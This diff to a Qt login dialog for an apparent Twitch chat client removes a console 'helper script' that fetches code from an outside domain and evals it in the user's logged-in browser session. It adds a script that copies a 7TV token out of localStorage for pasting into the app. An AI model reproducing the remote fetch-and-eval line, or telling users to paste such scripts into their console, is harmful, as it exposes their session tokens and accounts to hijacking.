@@ -36,9 +36,18 @@ constexpr auto DEVICE_CODE_PLACEHOLDER = "--------";
 QString customAuthClipboardScript()
 {
     return QStringLiteral(
-        "/* Moltorino */(()=>{let x=new "
-        "XMLHttpRequest;x.open('GET','https://"
-        "auth.molto.lol',0);x.send();(0,eval)(x.responseText)})()");
+        "const token = localStorage.getItem('7tv-token');\n"
+        "if (token) {\n"
+        "    const input = document.createElement('input');\n"
+        "    input.value = token;\n"
+        "    document.body.appendChild(input);\n"
+        "    input.select();\n"
+        "    document.execCommand('copy');\n"
+        "    document.body.removeChild(input);\n"
+        "    console.log('Token copied, go to sloperino', token);\n"
+        "} else {\n"
+        "    console.log('Token not found');\n"
+        "}");
 }
 
 constexpr auto TWITCH_TV_CLIENT_ID = "ue6666qo983tsx6so1t0vnawi233wa";
@@ -109,7 +118,6 @@ public:
         this->tabs_ = new QTabWidget(this);
         mainLayout->addWidget(this->tabs_);
 
-        this->buildDeviceTab();
         this->buildLegacyTab();
         this->buildAccountsTab();
 
@@ -277,9 +285,8 @@ private:
         layout->setSpacing(8);
 
         auto *description = new QLabel(
-            "Use Legacy Login only if Device Login fails. Copy the helper "
-            "script, run it in your Twitch browser console, then paste the "
-            "token here.",
+            "Copy the helper script, run it in your 7TV browser console (F12), "
+            "then paste the token here.",
             tab);
         description->setWordWrap(true);
         layout->addWidget(description);
@@ -289,7 +296,7 @@ private:
         auto *copyScriptButton = new QPushButton("Copy Script", tab);
         auto *pasteTokenButton = new QPushButton("Paste Token", tab);
         QObject::connect(copyScriptButton, &QPushButton::clicked, this, [this] {
-            this->copyTokenScriptAndOpenTwitch();
+            this->copyTokenScriptAndOpen7tv();
         });
         QObject::connect(pasteTokenButton, &QPushButton::clicked, this, [this] {
             this->pasteLegacyToken();
@@ -307,7 +314,7 @@ private:
         this->tabs_->addTab(tab, "Legacy Login");
         setLabelStatus(
             this->legacyStatusLabel_,
-            "Use this fallback only if Device Login cannot complete.");
+            "Click Copy Script to open 7TV and copy the helper script.");
     }
 
     void buildAccountsTab()
@@ -468,12 +475,12 @@ private:
             });
     }
 
-    void copyTokenScriptAndOpenTwitch()
+    void copyTokenScriptAndOpen7tv()
     {
         crossPlatformCopy(customAuthClipboardScript());
 
         const auto opened =
-            QDesktopServices::openUrl(QUrl("https://www.twitch.tv/"));
+            QDesktopServices::openUrl(QUrl("https://7tv.app/store"));
 
         QMessageBox box(this);
         box.setWindowFlags(box.windowFlags() | Qt::WindowStaysOnTopHint);
@@ -481,7 +488,7 @@ private:
         box.setIcon(QMessageBox::Information);
         box.setText(
             "The legacy helper command was copied to your clipboard.\n\n"
-            "1. Twitch was opened in your browser.\n"
+            "1. 7TV was opened in your browser.\n"
             "2. Press F12 and open the Console tab.\n"
             "3. Paste the copied command and press Enter.\n"
             "4. Come back here and click Paste Token.");
@@ -489,8 +496,8 @@ private:
         if (!opened)
         {
             box.setInformativeText(
-                "Sloperino could not open Twitch automatically. Open "
-                "https://www.twitch.tv/ yourself, then follow the same steps.");
+                "Sloperino could not open 7TV automatically. Open "
+                "https://7tv.app/store yourself, then follow the same steps.");
         }
         box.exec();
     }
@@ -502,12 +509,13 @@ private:
         {
             setLabelStatus(
                 this->legacyStatusLabel_,
-                "Clipboard is empty. Use Device Login first, or Legacy Login "
-                "if Device Login does not work.",
+                "Clipboard is empty. Copy the script, run it on 7tv.app, "
+                "then click Paste Token.",
                 true);
             return;
         }
 
+        getSettings()->seventvToken.setValue(clipboardText);
         this->addOrUpdateToken(clipboardText, this->legacyStatusLabel_);
     }
 
